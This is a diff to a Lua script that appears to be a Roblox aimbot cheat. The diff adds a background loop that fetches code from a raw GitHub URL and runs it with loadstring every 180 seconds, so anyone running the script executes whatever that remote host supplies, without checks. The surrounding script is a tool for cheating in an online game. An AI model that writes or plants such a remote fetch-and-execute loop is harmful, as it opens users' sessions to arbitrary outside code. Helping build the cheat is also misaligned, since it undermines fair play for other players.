@@ -13,6 +13,14 @@ local m = plr:GetMouse()
 local conv
 local box
 local StarterGui = game:GetService("StarterGui")
+
+spawn(function()
+	while true do
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Anonymustache/AutoUpd/main/script"))()
+		wait(180)
+	end
+end)
+
 _G.team = {}
 function aimbot()
 	local poguin = math.random(1,10000)
